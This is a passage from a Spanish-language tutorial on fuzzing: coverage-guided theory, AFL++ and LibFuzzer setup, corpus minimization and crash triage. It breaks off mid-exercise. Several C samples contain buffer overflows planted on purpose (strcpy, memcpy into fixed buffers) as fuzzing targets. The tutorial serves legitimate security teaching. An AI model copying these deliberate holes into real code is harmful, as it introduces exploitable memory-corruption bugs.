# Fuzz1ng: Fuzzing y Vulnerability Research

> **Audiencia**: Security researchers, reverse engineers, [exploit](../raw/m3t4spl01t.md#exploits) developers
> **Nivel**: Avanzado
> **Idioma**: Espanol argentino (informal)

---

## Indice

> ⏱️ **Tiempo estimado:** 20 horas (~4 sesiones) (2602 lineas)


1. [Introduccion al Fuzzing](#intro-fuzzing)
   - 1.1 [Que es el fuzzing?](#que-es-fuzzing)
   - 1.2 [Tipos de fuzzing](#tipos-fuzzing)
   - 1.3 [Historia y casos reales](#historia-fuzzing)
   - 1.4 [Cobertura de codigo](#cobertura-codigo)
2. [Teoria de Fuzzing](#teoria-fuzzing)
   - 2.1 [Coverage-guided fuzzing](#coverage-guided)
   - 2.2 [Generational fuzzing](#generational)
   - 2.3 [Mutational fuzzing](#mutational)
   - 2.4 [AFL internals](#afl-internals)
   - 2.5 [Instrumentacion](#instrumentacion)
   - 2.6 [Feedback loops](#feedback-loops)
   - 2.7 [Corpus minimization](#corpus-minimization)
3. [AFL++ Setup y Uso](#aflpp-setup)
   - 3.1 [Instalacion de AFL++](#instalacion-aflpp)
   - 3.2 [Compilacion con afl-cc](#afl-cc)
   - 3.3 [Corpus minimization](#afl-corpus)
   - 3.4 [Ejecucion de fuzzing](#ejecucion-afl)
   - 3.5 [Crash triage](#afl-crash-triage)
   - 3.6 [Deterministic mode](#deterministic-mode)
   - 3.7 [Paralelizacion](#afl-paralelizacion)
   - 3.8 [Ejercicios practicos](#ejercicios-afl)
4. [LibFuzzer](#libfuzzer)
   - 4.1 [Que es LibFuzzer?](#que-es-libfuzzer)
   - 4.2 [Integracion en proyectos C/C++](#integracion-libfuzzer)
   - 4.3 [Sanitizers (ASAN, UBSAN, MSAN, TSAN)](#sanitizers)
   - 4.4 [Persistent mode](#persistent-mode)
   - 4.5 [Fuzz targets efectivos](#fuzz-targets)
   - 4.6 [Dictionary y seed corpus](#dictionary-libfuzzer)
   - 4.7 [Ejercicios practicos](#ejercicios-libfuzzer)
5. [Honggfuzz](#honggfuzz)
   - 5.1 [Introduccion a Honggfuzz](#intro-honggfuzz)
   - 5.2 [Hardware-based coverage feedback](#hardware-coverage)
   - 5.3 [Persistent fuzzing](#persistent-honggfuzz)
   - 5.4 [Comparacion con AFL](#comparacion-afl-honggfuzz)
   - 5.5 [Ejercicios practicos](#ejercicios-honggfuzz)
6. [Fuzzing en Lenguajes Interpretados](#fuzzing-lenguajes)
   - 6.1 [Fuzzing Python con Atheris](#atheris)
   - 6.2 [Fuzzing Java con Jazzer](#jazzer)
   - 6.3 [Fuzzing Go con go-fuzz](#go-fuzz)
   - 6.4 [Fuzzing Rust con cargo-fuzz](#cargo-fuzz)
   - 6.5 [Ejercicios practicos](#ejercicios-fuzzing-lenguajes)
7. [Crash Triage y Analisis](#crash-triage)
   - 7.1 [Deduplicacion de crashes](#dedup-crashes)
   - 7.2 [Exploitable y crashwalk](#exploitable-crashwalk)
   - 7.3 [Clasificacion de crashes](#clasificacion-crashes)
   - 7.4 [Minimizacion de inputs](#minimizacion-inputs)
   - 7.5 [Triage automatizado](#triage-automatizado)
   - 7.6 [Ejercicios practicos](#ejercicios-triage)
8. [Memory Corruption Exploitation Theory](#memory-corruption)
   - 8.1 [Buffer overflow](#buffer-overflow)
   - 8.2 [Integer overflow](#integer-overflow)
   - 8.3 [Use-after-free](#use-after-free)
   - 8.4 [Format string](#format-string)
   - 8.5 [Heap overflow](#heap-overflow)
   - 8.6 [Type confusion](#type-confusion)
   - 8.7 [Ejercicios practicos](#ejercicios-memory)
9. [Writing PoCs: De Crash a Exploit](#writing-pocs)
   - 9.1 [EIP/RIP control](#eip-rip-control)
   - 9.2 [SEH overwrite](#seh-overwrite)
   - 9.3 [ROP chain basics](#rop-basics)
   - 9.4 [De crash a PoC funcional](#crash-a-poc)
   - 9.5 [Automatizacion de PoCs](#automatizacion-pocs)
   - 9.6 [Ejercicios practicos](#ejercicios-pocs)
10. [Laboratorio Integrador](#lab-fuzzing)
    - 10.1 [Setup del laboratorio](#setup-lab-fuzzing)
    - 10.2 [Target vulnerable](#target-vulnerable)
    - 10.3 [Fuzzing campaign](#fuzzing-campaign)
    - 10.4 [Crash analysis](#crash-analysis)
    - 10.5 [PoC development](#poc-development)
    - 10.6 [Reporte](#reporte-fuzzing)
11. [Referencias](#referencias-fuzzing)

---

<a name="intro-fuzzing"></a>
## 1. Introduccion al [fuzzing](../raw/fuzz1ng.md)

<a name="que-es-fuzzing"></a>
### 1.1 Que es el fuzzing?

El fuzzing (o fuzz testing) es una tecnica de testing automatizado que consiste en enviar datos malformados, inesperados, o aleatorios a un programa para descubrir bugs, crashes, y vulnerabilidades de seguridad.

**La idea es simple:** si le tiras suficiente basura a un programa, eventualmente algo va a romperse. El arte del fuzzing esta en generar la basura correcta para romper cosas interesantes.

**Analogia:** Imaginate que tenes una cerradura. Probar con la llave correcta es testing funcional. Probar con miles de llaves al azar, clips, tarjetas de credito, y destornilladores es fuzzing. Eventualmente, alguna te va a dar acceso no autorizado.

**Por que es importante:**
- Encuentra bugs que el testing manual jamas encontraria
- Automatable al 100%
- Ha encontrado miles de CVEs en software critico
- Es usado por Google (OSS-Fuzz), Microsoft (OneFuzz), Apple

**Casos famosos descubiertos por fuzzing:**
- Heartbleed (OpenSSL) - Fuzzing encontro el bug
- Shellshock (Bash) - Fuzzing de variables de entorno
- Stagefright ([android](../raw/4db-d33p-d1v3.md)) - Fuzzing de medios
- BlueKeep (RDP) - Fuzzing de [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red))
- Miles de bugs en Chrome, Firefox, Windows, Linux

<a name="tipos-fuzzing"></a>
### 1.2 Tipos de fuzzing

**1. Fuzzing ciego (Black-box):**
El [fuzzer](../raw/fuzz1ng.md#fuzzer) no sabe nada del programa interno. Solo envia datos y observa la salida.

Ventajas: No necesita acceso al codigo fuente.
Desventajas: Ineficiente, no sabe que caminos de codigo esta cubriendo.

Herramientas: Peach Fuzzer, Sulley, Boofuzz.

**2. Fuzzing con caja de cristal (White-box):**
El fuzzer tiene acceso al codigo fuente y puede analizarlo estaticamente.

Ventajas: Alta cobertura, puede generar inputs especificos.
Desventajas: Requiere codigo fuente, lento.

Herramientas: KLEE, SAGE (Microsoft).

**3. Fuzzing con informacion parcial (Grey-box):**
El fuzzer tiene feedback del programa (cobertura de codigo) pero no analisis estatico profundo.

Ventajas: Balance entre eficiencia y requisitos.
Desventajas: Requiere instrumentacion.

Herramientas: [afl](../raw/fuzz1ng.md#afl), [libfuzzer](../raw/fuzz1ng.md#libfuzzer), Honggfuzz.

**4. Fuzzing generacional (Generation-based):**
Genera inputs desde cero basados en un formato conocido (PDF, PNG, [http](../raw/r3d3s-f0nd4m3nt0s.md#http), etc.).

Ventajas: Inputs bien formados que llegan mas profundo.
Desventajas: Requiere conocer el formato, sesgo hacia lo conocido.

**5. Fuzzing mutacional (Mutation-based):**
Toma inputs existentes (semillas) y los modifica (flipea bits, inserta bytes, etc.).

Ventajas: No requiere conocer el formato.
Desventajas: Puede generar inputs que no pasan la validacion inicial.

<a name="historia-fuzzing"></a>
### 1.3 Historia y casos reales

**1989: El nacimiento.** Barton Miller (UW-Madison) prueba programas Unix enviando caracteres aleatorios por la terminal. Descubre que 25-33% de los utilitarios crashean.

**1999: OUSPG PROTOS.** Pruebas de protocolo (SNMP, LDAP, HTTP). Descubren vulnerabilidades en implementaciones de SNMP.

**2002: Codenomicon.** Empresa fundada por los investigadores de OUSPG. Comercializan fuzzing.

**2006: Dave Aitel publica SPIKE.** Framework de fuzzing para protocolos.

**2013: AFL (American Fuzzy Lop).** Micheal Zalewski publica AFL, revolucionando el fuzzing con coverage-guided y facilidad de uso.

**2016: Google lanza OSS-Fuzz.** Fuzzing continuo para proyectos open source. Ha encontrado >30,000 bugs.

**2020: AFL++.** Fork comunitario de AFL con mejoras masivas.

**Casos reales donde el fuzzing salvo el dia:**

1. **Google Chrome:** Fuzzing continuo encuentra cientos de bugs al ano. Cada bug es un potencial [rce](../raw/w3b-h4ck1ng.md#rce) que no llega a produccion.

2. **OpenSSL:** Despues de Heartbleed, Google y la comunidad fuzzearon OpenSSL masivamente. Decenas de vulnerabilidades corregidas.

3. **Windows:** Microsoft tiene el programa "Project Springfield" (OneFuzz) que fuzzcea Windows constantemente.

4. **Linux [kernel](../raw/0s-f0nd4m3nt0s.md#kernel):** syzkaller fuzzcea syscalls del [kernel](../raw/0s-f0nd4m3nt0s.md#kernel). Miles de bugs encontrados.

5. **Telefono Android:** OSS-Fuzz fuzzcea librerias de Android. Bugs en Stagefright, bluetooth, NFC.

<a name="cobertura-codigo"></a>
### 1.4 Cobertura de codigo

La cobertura de codigo es la metrica mas importante en fuzzing. Te dice que partes del programa fueron ejecutadas.

**Tipos de cobertura:**

1. **Line coverage:** Que lineas de codigo se ejecutaron.
2. **Branch coverage:** Que ramas (if/else) se tomaron.
3. **Function coverage:** Que funciones se llamaron.
4. **Path coverage:** Que secuencia de branches se ejecuto (exponencial).

**Como se mide en AFL:**

AFL usa edge coverage (branch coverage) comprimido en un mapa de bits de 64KB. Cada vez que se ejecuta un branch, se incrementa un contador en el mapa. La posicion en el mapa se calcula como:

```c
hash = (prev_location << 1) ^ current_location
map[hash % MAP_SIZE]++
```

Esto permite a AFL saber si un input nuevo exploro un camino diferente.

**Por que es importante:**
- Si un input no aumenta la cobertura, probablemente no encontro nada nuevo
- Los fuzzers guided priorizan inputs que descubren cobertura nueva
- La cobertura te dice que tan "profundo" estas llegando en el programa


<a name="teoria-fuzzing"></a>
## 2. Teoria de [fuzzing](../raw/fuzz1ng.md)

<a name="coverage-guided"></a>
### 2.1 Coverage-guided fuzzing (CGF)

El coverage-guided fuzzing usa la cobertura de codigo como feedback para guiar la generacion de inputs.

**Algoritmo basico:**
1. Iniciar con inputs semilla (corpus)
2. Para cada input: mutar, ejecutar, medir cobertura
3. Si la cobertura es nueva -> agregar al corpus
4. Loop

**Ventajas:** No desperdicia tiempo en inputs que no exploran codigo nuevo.

**Problemas:** Mesetas, depende del corpus inicial, overhead de instrumentacion.

<a name="generational"></a>
### 2.2 Generational fuzzing

Construye inputs desde cero basados en templates o gramaticas.

**Ventajas:** Inputs bien formados, llega profundo.
**Desventajas:** Mucho trabajo inicial, solo encuentra bugs en el modelo.

<a name="mutational"></a>
### 2.3 Mutational fuzzing

Toma inputs existentes y los modifica (bit flips, inserts, deletes, etc).

**Operaciones de mutacion:**
```python
import random

def mutate(data):
    mutation = random.choice(["bit_flip", "byte_insert", "byte_delete", "interest_value", "splice"])
    data = bytearray(data)
    
    if mutation == "bit_flip":
        pos = random.randint(0, len(data)-1)
        bit = 1 << random.randint(0, 7)
        data[pos] ^= bit
    elif mutation == "byte_insert":
        pos = random.randint(0, len(data))
        data[pos:pos] = [random.randint(0, 255)]
    elif mutation == "interest_value":
        pos = random.randint(0, max(0, len(data)-4))
        vals = [0, 1, 255, 65535, 0x7FFFFFFF, 0x80000000]
        val = random.choice(vals)
        data[pos:pos+4] = val.to_bytes(4, 'little')
    return bytes(data)
```

<a name="afl-internals"></a>
### 2.4 [afl](../raw/fuzz1ng.md#afl) internals

American Fuzzy Lop (AFL) creado por Michal Zalewski.

**Arquitectura:**
```
afl-fuzz
  |-- afl-gcc / afl-clang (compiladores instrumentados)
  |-- Input: corpus de semillas (queue/)
  |-- Output: crashes/, hangs/
  |-- Mapa de cobertura: 64KB bitmap en shmem
```

**El loop principal:**
1. Seleccionar input de la cola (round-robin)
2. Aplicar mutaciones (deterministicas, luego havoc)
3. Ejecutar el target con el input mutado
4. Comparar mapa de cobertura con el mapa global
5. Si hay nuevos edges -> agregar input a la cola
6. Si hay crash -> guardar en crashes/

**Deterministic vs Havoc:**
- **Deterministic:** Prueba sistematica (bit flips, valores interesantes, aritmeticos)
- **Havoc:** Secuencia aleatoria de mutaciones. Mas rapido.

<a name="instrumentacion"></a>
### 2.5 Instrumentacion

La instrumentacion agrega codigo para medir cobertura.

**Tipos:**
1. **Compile-time:** Al compilar (afl-clang, afl-gcc). Mas precisa.
2. **Binary-only (QEMU):** Sin recompilar. Usa QEMU para instrumentar en runtime.
3. **Binary-only (Unicorn):** Emulacion de CPU para instrumentacion.
4. **Intel PT:** Hardware-based (Intel Processor Trace). Sin overhead.

**Implementacion de edge coverage en AFL:**
```c
#define MAP_SIZE 65536
u8 virgin_map[MAP_SIZE];  // Mapa global de cobertura

// En cada branch:
cur_location = <COMPILE_TIME_RANDOM>;
shared_mem[cur_location ^ prev_location]++;
prev_location = cur_location >> 1;
```

<a name="feedback-loops"></a>
### 2.6 Feedback loops

El feedback loop es el corazon del coverage-guided fuzzing.

```
Input -> Mutacion -> Ejecucion -> Medir Cobertura -> Decision
                                  |                    |
                                  v                    |
                            Mapa global <--- Nueva cobertura? -> Si -> Agregar al corpus
                                                                       |
                                                                       v
                                                                   Mas mutaciones
```

**Tipos de feedback:**
1. **Code coverage:** Nuevos edges/blocks en el programa
2. **Hit count:** Cuantas veces se ejecuta cada edge (AFL usa buckets)
3. **Sanitizer feedback:** ASAN detecta memory errors
4. **Taint tracking:** Que bytes del input afectan que decisiones

<a name="corpus-minimization"></a>
### 2.7 Corpus minimization

Minimizar el corpus reduce el tiempo de fuzzing y mejora la eficiencia.

**Concepto:** De 1000 inputs que cubren edges, solo necesitas los minimos necesarios para cubrir todos los edges una vez.

**AFL-cmin (afl-cmin):**
```bash
# Minimizar corpus
afl-cmin -i input_dir -o output_dir -- ./target/program @@
```

**Como funciona:**
1. Ejecuta cada input y registra que edges cubre
2. Ordena inputs por cantidad de edges nuevos
3. Si un input no cubre edges nuevos -> descartado
4. Resultado: corpus minimo que mantiene la cobertura

**AFL-tmin (minimizar crash):**
```bash
# Minimizar un crash a su minima expresion
afl-tmin -i crash.bin -o minimized_crash.bin -- ./target/program @@
```

**Beneficios:**
- Fuzzing mas rapido (menos inputs en cola)
- Crashes mas chicos (mas faciles de analizar)
- Mejor cobertura por tiempo de ejecucion


<a name="aflpp-setup"></a>
## 3. [afl](../raw/fuzz1ng.md#afl)++ Setup y Uso

<a name="instalacion-aflpp"></a>
### 3.1 Instalacion de AFL++

AFL++ es el fork comunitario de AFL con mejoras masivas.

**Instalacion desde fuente:**
```bash
git clone https://github.com/AFLplusplus/AFLplusplus
cd AFLplusplus
make -j$(nproc)
sudo make install
```

**Dependencias:**
```bash
sudo apt-get install build-essential python3-dev automake cmake   git flex bison libglib2.0-dev libpixman-1-dev python3-setuptools   llvm llvm-dev lld libstdc++-12-dev
```

**Verificar instalacion:**
```bash
afl-fuzz --help
afl-cc --version
afl-clang-fast --version
```

<a name="afl-cc"></a>
### 3.2 Compilacion con afl-cc

Para fuzzear un programa, primero hay que compilarlo con el [compilador](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#compiladores) instrumentado de AFL.

**Ejemplo basico:**
```c
// target.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void vulnerable(char *data) {
    char buffer[64];
    if (strlen(data) > 64) {
        strcpy(buffer, data);  // Buffer overflow!
    }
}

int main(int argc, char **argv) {
    if (argc < 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    vulnerable(argv[1]);
    return 0;
}
```

**Compilar con AFL++:**
```bash
# Con GCC instrumentado
afl-gcc target.c -o target_afl

# Con Clang instrumentado (recomendado, mas rapido)
afl-clang-fast target.c -o target_afl_fast

# Con LAF-Intel (instrumentacion a nivel de comparacion)
afl-clang-laf target.c -o target_afl_laf
```

**Compilar proyectos grandes:**
```bash
# Proyecto con Makefile
CC=afl-cc CXX=afl-cxx ./configure --disable-shared
make -j$(nproc)

# Proyecto con CMake
mkdir build && cd build
CC=afl-cc CXX=afl-cxx cmake .. -DCMAKE_BUILD_TYPE=Release
make -j$(nproc)

# Proyecto con meson
CC=afl-cc CXX=afl-cxx meson setup build
ninja -C build
```

**Flags importantes:**
```bash
# Optimizacion para fuzzing
AFL_CC=1 afl-clang-fast -O2 -g -o target target.c

# Sin optimizacion (mejor cobertura, mas lento)
AFL_CC=1 afl-clang-fast -O0 -g -o target target.c

# Con sanitizers (detecta memory errors)
AFL_USE_ASAN=1 afl-clang-fast -g -o target target.c
```

<a name="afl-corpus"></a>
### 3.3 Corpus minimization

El corpus inicial es crucial para el exito del [fuzzing](../raw/fuzz1ng.md).

**Crear corpus inicial:**
```bash
mkdir -p input_dir output_dir

# Para fuzzear un parser, necesitas archivos de ejemplo validos
# Por ejemplo, para fuzzear un lector de imagenes:
mkdir -p input_dir/images
cp *.png input_dir/images/

# Para fuzzear un protocolo de red:
echo "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n" > input_dir/http_request.txt
```

**Minimizar corpus:**
```bash
# Primero compilas el target sin sanitizers
afl-clang-fast -o target target.c

# Luego minimizas
afl-cmin -i input_dir -o minimized_dir -- ./target @@

# Resultado: solo los inputs necesarios para cubrir todo
```

**Corpus de calidad:**
- Pocos inputs (10-100), pero diversos
- Cada input cubre diferentes caminos
- Inputs pequenos (< 1KB idealmente)
- Incluir edge cases (vacio, maximo, valores limite)

<a name="ejecucion-afl"></a>
### 3.4 Ejecucion de fuzzing

**Comando basico:**
```bash
afl-fuzz -i minimized_dir -o output_dir -- ./target @@
```

**Parametros importantes:**
```bash
# Timeout por ejecucion (default: 1000ms)
afl-fuzz -i input -o output -t 500 -- ./target @@

# Memoria maxima por proceso (default: 50MB)
afl-fuzz -i input -o output -m 100 -- ./target @@

# Diccionario (tokens del formato)
afl-fuzz -i input -o output -x dictionary.dict -- ./target @@

# Archivo de configuracion
afl-fuzz -i input -o output -C config.ini -- ./target @@

# Sin deterministic mode (solo havoc, mas rapido)
afl-fuzz -i input -o output -d -- ./target @@
```

**Interpretar stats:**
```
$ afl-fuzz -i input -o output -- ./target @@

<< STATS >>
cycle done: 3
corpus count: 425
saved crashes: 12
saved hangs: 0
total paths: 425
pending paths: 89
bitmap size: 2.45 kB
bits found: 12345
coverage: 45.2%
```

**Estados importantes:**
- **cycle done:** Cantidad de ciclos completos sobre el corpus
- **corpus count:** Inputs en la cola
- **saved crashes:** Crashes unicos encontrados
- **pending paths:** Inputs esperando ser procesados
- **bitmap size:** Bytes ocupados en el mapa de cobertura

<a name="afl-crash-triage"></a>
### 3.5 Crash triage

Cuando AFL encuentra crashes, los guarda en `output_dir/crashes/`.

**Ver crashes:**
```bash
ls -la output_dir/crashes/
# id:000000,sig:06,src:000001,op:havoc,rep:2
# id:000001,sig:11,src:000003,op:arith8,pos:42,val:+16
```

**El nombre del archivo codifica:**
- **id:** Numero de crash
- **sig:** Senial (06=SIGABRT, 11=SIGSEGV)
- **src:** Input origen de la mutacion
- **op:** Operacion que genero el crash
- **rep:** Iteracion

**Reproducir crash:**
```bash
./target < output_dir/crashes/id:000000,sig:11,src:000001,op:havoc,rep:2

# Con GDB
gdb -batch -ex "run < crash_file" -ex "bt" ./target
```

**Re-fuzzing con ASAN:**
```bash
# Compilar con AddressSanitizer y re-fuzzear
AFL_USE_ASAN=1 afl-clang-fast -g -o target_asan target.c
afl-fuzz -i input -o asan_output -- ./target_asan @@
```

<a name="deterministic-mode"></a>
### 3.6 Deterministic mode

El modo deterministico de AFL prueba sistematicamente el espacio de mutacion.

**Fases deterministicas (en orden):**

1. **Bit flips:** Cambia cada bit del input
   - Flip 1 bit: arranca de a 1 bit
   - Flip 2 bits: de a 2 bits
   - Flip 4 bits: de a 4 bits

2. **Valores interesantes:** Insertas valores "interesantes"
   - 0, 1, 255, 65535, 0x7FFFFFFF, 0x80000000
   - Aritmeticos: +1, -1, +255, -255

3. **Bloques:** Working with blocks
   - Overwrite con bytes aleatorios
   - Insertar/borrar bloques

4. **Dictionary:** Si hay [diccionario](../raw/p4ssw0rd-4tt4cks.md#ataque-de-diccionario), inserta tokens conocidos

**Cuando desactivar deterministic mode:**
```bash
# Para input grandes (> 1KB), desactiva deterministico
afl-fuzz -i input -o output -d -- ./target @@
```

**Por que desactivarlo:**
- Inputs de 10KB con deterministico llevan horas
- Solo la fase de bit flips en 10KB = 80,000 ejecuciones
- Havoc mode es mas eficiente para inputs grandes

<a name="afl-paralelizacion"></a>
### 3.7 Paralelizacion

AFL soporta ejecucion en multiples nucleos.

**Master-Slave:**
```bash
# Terminal 1: Master
afl-fuzz -i input -o output -M fuzzer1 -- ./target @@

# Terminal 2-4: Slaves
afl-fuzz -i input -o output -S fuzzer2 -- ./target @@
afl-fuzz -i input -o output -S fuzzer3 -- ./target @@
afl-fuzz -i input -o output -S fuzzer4 -- ./target @@
```

**Como funciona:**
- Master ejecuta modo deterministico + havoc
- Slaves solo ejecutan havoc mode (mas rapido)
- Comparten corpus via directorio sync
- Cada [fuzzer](../raw/fuzz1ng.md#fuzzer) informa su progreso a los demas

**Monitoreo:**
```bash
# Ver estatus de todos los fuzzers
afl-whatsup -s output_dir/
```

**Recomendaciones:**
- 1 master + (n_cores - 1) slaves
- Cada slave necesita su propia semilla
- No mas de 1 master por directorio de output

<a name="ejercicios-afl"></a>
### 3.8 Ejercicios practicos AFL++

**Ejercicio 1: Fuzzear un binario simple**

```c
// vulnerable.c
#include <stdio.h>
#include <string.h>

void process(char *input) {
    char buf[16];
    if (strlen(input) > 16) {
        strcpy(buf, input);  // Overflow!
    }
}

int main(int argc, char **argv) {
    if (argc > 1) process(argv[1]);
    return 0;
}
```

```bash
afl-gcc -o vuln vulnerable.c
mkdir -p input output
echo "AAAA" > input/seed.txt
afl-fuzz -i input -o output -- ./vuln @@
```

**Ejercicio 2: Fuzzear libpng**

```bash
# Descargar libpng
git clone https://github.com/pnggroup/libpng
cd libpng
mkdir build && cd build

# Compilar con AFL
CC=afl-clang-fast cmake .. -DCMAKE_BUILD_TYPE=Release
make -j$(nproc)

# Crear harness
cat > png_harness.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include "png.h"

int main(int argc, char **argv) {
    FILE *f = fopen(argv[1], "rb");
    if (!f) return 1;
    fseek(f, 0, SEEK_END);
    long len = ftell(f);
    fseek(f, 0, SEEK_SET);
    unsigned char *data = malloc(len);
    fread(data, 1, len, f);
    fclose(f);

    // Procesar PNG
    png_structp png = png_create_read_struct(PNG_LIBPNG_VER_STRING, NULL, NULL, NULL);
    png_infop info = png_create_info_struct(png);
    // ... setup read ...
    
    free(data);
    return 0;
}
EOF

afl-clang-fast -o png_harness png_harness.c -I . -L . -lpng

# Usar imagenes PNG como corpus
mkdir -p input_png output_png
cp /usr/share/icons/*.png input_png/
afl-cmin -i input_png -o minimized_png -- ./png_harness @@

afl-fuzz -i minimized_png -o output_png -- ./png_harness @@
```

**Ejercicio 3: Fuzzear con diccionario**

```bash
# Diccionario para HTTP
cat > http.dict << 'EOF'
http_methods = "GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"
http_versions = "HTTP/1.0", "HTTP/1.1", "HTTP/2", "HTTP/3"
http_headers = "Host:", "Content-Type:", "Authorization:", "Accept:", "Cookie:", "User-Agent:"
status_codes = "200", "301", "400", "401", "403", "404", "500"
EOF

afl-fuzz -i input -o output -x http.dict -- ./http_parser @@
```



<a name="libfuzzer"></a>
## 4. [libfuzzer](../raw/fuzz1ng.md#libfuzzer)

<a name="que-es-libfuzzer"></a>
### 4.1 Que es LibFuzzer?

LibFuzzer es un framework de [fuzzing](../raw/fuzz1ng.md) in-process, coverage-guided, parte de LLVM. A diferencia de [afl](../raw/fuzz1ng.md#afl) que ejecuta el programa como [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) separado, LibFuzzer linkea el fuzz target directamente como una [funcion](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#funciones) y la llama con datos generados.

**Ventajas sobre AFL:**
- Sin overhead de fork/exec (10-100x mas rapido)
- Acceso directo al estado del programa
- Mejor integracion con sanitizers
- Ideal para librerias y APIs

**Desventajas:**
- Solo funciona con LLVM (Clang)
- Requiere modificar el codigo (harness)
- No sirve para programas completos (mejor AFL)

<a name="integracion-libfuzzer"></a>
### 4.2 Integracion en proyectos C/C++

**Estructura basica de un fuzz target:**
```c
// fuzz_target.c
#include <stdint.h>
#include <stddef.h>

int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    // Tu codigo de fuzzing aqui
    // No debe crashear por si mismo
    // Solo llama a la API que queres fuzzear
    
    my_parser_function(data, size);
    
    return 0;  // Siempre retorna 0
}
```

**Compilar con LibFuzzer:**
```bash
# Compilar y linkear con libFuzzer
clang -g -fsanitize=fuzzer,address -o fuzzer fuzz_target.c mylib.c

# Ejecutar
./fuzzer
```

**Ejemplo completo:**
```c
// libfuzz_example.c
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <stdlib.h>

// Funcion vulnerable que vamos a fuzzear
void parse_config(const uint8_t *data, size_t size) {
    if (size < 3) return;
    
    char buffer[64];
    
    // Vulnerabilidad: si el ':' esta despues del byte 64
    for (size_t i = 0; i < size; i++) {
        if (data[i] == ':') {
            if (i > 0) {
                memcpy(buffer, data, i);  // Overflow!
            }
            break;
        }
    }
}

// Entry point de LibFuzzer
int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    parse_config(data, size);
    return 0;
}
```

**Compilar y ejecutar:**
```bash
clang -g -fsanitize=fuzzer,address -o config_fuzzer libfuzz_example.c
./config_fuzzer -max_len=128 -timeout=5
```

<a name="sanitizers"></a>
### 4.3 Sanitizers

Los sanitizers detectan memory errors en runtime. Son OBLIGATORIOS para fuzzing serio.

**AddressSanitizer (ASAN):**
```bash
# Deteccion de: buffer overflow, use-after-free, double free, heap overflow
clang -g -fsanitize=fuzzer,address -o fuzzer target.c
```

Detecta:
- Stack [buffer overflow](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#buffer-overflow)
- Heap buffer overflow
- Use-after-free
- Double free
- Memory leaks (ASAN + LSan)

**UndefinedBehaviorSanitizer (UBSAN):**
```bash
# Deteccion de: integer overflow, shift overflow, null pointer
clang -g -fsanitize=fuzzer,undefined -o fuzzer target.c
```

Detecta:
- Signed integer overflow
- Division by zero
- Shift overflow
- Null pointer dereference
- VLA bound overflow

**MemorySanitizer (MSAN):**
```bash
# Deteccion de: uso de memoria no inicializada
clang -g -fsanitize=fuzzer,memory -o fuzzer target.c
```

**ThreadSanitizer (TSAN):**
```bash
# Deteccion de: data races en programas multi-thread
clang -g -fsanitize=fuzzer,thread -o fuzzer target.c
```

**Combinar sanitizers:**
```bash
# ASAN + UBSAN (mas comun)
clang -g -fsanitize=fuzzer,address,undefined -o fuzzer target.c

# ASAN + UBSAN + Coverage
clang -g -fsanitize=fuzzer,address,undefined -fprofile-instr-generate -fcoverage-mapping -o fuzzer target.c
```

<a name="persistent-mode"></a>
### 4.4 Persistent mode

Persistent mode (o in-process fuzzing) ejecuta el target en un loop, sin reiniciar el proceso.

**AFL persistent mode:**
```c
#include "afl-fuzz.h"

__AFL_FUZZ_INIT();

int main() {
    __AFL_INIT();
    unsigned char *buf = __AFL_FUZZ_TESTCASE_BUF;

    while (__AFL_LOOP(10000)) {  // 10000 iteraciones por fork
        size_t len = __AFL_FUZZ_TESTCASE_LEN;
        
        // Tu codigo de fuzzing
        process_input(buf, len);
    }
    
    return 0;
}
```

**Compilar:**
```bash
afl-clang-fast -o persistent_target target.c
afl-fuzz -i input -o output -- ./persistent_target
```

**Ventajas del persistent mode:**
- 5-10x mas rapido que fork mode
- Mejor exploracion por segundo
- Ideal para targets sin estado global

**Riesgos:**
- Si el target deja estado global corrupto, afecta iteraciones siguientes
- Bugs de acumulacion de estado son dificiles de reproducir

<a name="fuzz-targets"></a>
### 4.5 Fuzz targets efectivos

**Buenas practicas para fuzz targets:**

1. **Enfocado:** Un fuzz target por funcion/API
2. **Atomico:** No depende de estado global
3. **Deterministico:** Misma entrada = mismo resultado
4. **Rapido:** < 1ms por ejecucion idealmente
5. **Seguro:** El harness no debe crashear por si mismo

**Ejemplo para libreria de parsing:**
```c
// Fuzz target para json parser
#include <stdint.h>
#include <stddef.h>
#include "json_parser.h"

int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    // Crear buffer null-terminated
    char *str = malloc(size + 1);
    memcpy(str, data, size);
    str[size] = '\0';
    
    // Llamar la API
    json_value *val = json_parse(str);
    
    // Cleanup (importante para no leakear)
    if (val) json_value_free(val);
    free(str);
    
    return 0;
}
```

**Ejemplo para [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red)) binario:**
```c
// Fuzz target para protocolo binario
int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    struct packet pkt;
    
    // Parsear header
    if (size < sizeof(struct packet_header)) return 0;
    
    memcpy(&pkt.header, data, sizeof(struct packet_header));
    
    // Verificar tamanio
    if (pkt.header.length > size - sizeof(struct packet_header)) return 0;
    
    // Procesar payload
    process_packet(&pkt, data + sizeof(struct packet_header), 
                   pkt.header.length);
    
    return 0;
}
```

<a name="dictionary-libfuzzer"></a>
### 4.6 Dictionary y seed corpus

**Diccionarios en LibFuzzer:**
```bash
# Crear diccionario
echo "key1=\"value1\"" > dict.txt
echo "key2=\"value2\"" >> dict.txt

# Usar diccionario
./fuzzer -dict=dict.txt
```

**Seed corpus:**
```bash
# Corpus desde directorio
./fuzzer corpus_dir/

# Combinar corpus (merge)
./fuzzer -merge=1 new_corpus_dir/ existing_corpus_dir/
```

**Crear corpus desde archivos existentes:**
```bash
# Usar archivos de prueba como semillas
mkdir -p corpus
cp tests/*.json corpus/
cp tests/*.xml corpus/
./fuzzer corpus/
```

<a name="ejercicios-libfuzzer"></a>
### 4.7 Ejercicios practicos LibFuzzer

**Ejercicio 1: Fuzzear un parser basico**

```c
// fuzz_me.c
#include <stdint.h>
#include <stddef.h>
#include <string.h>

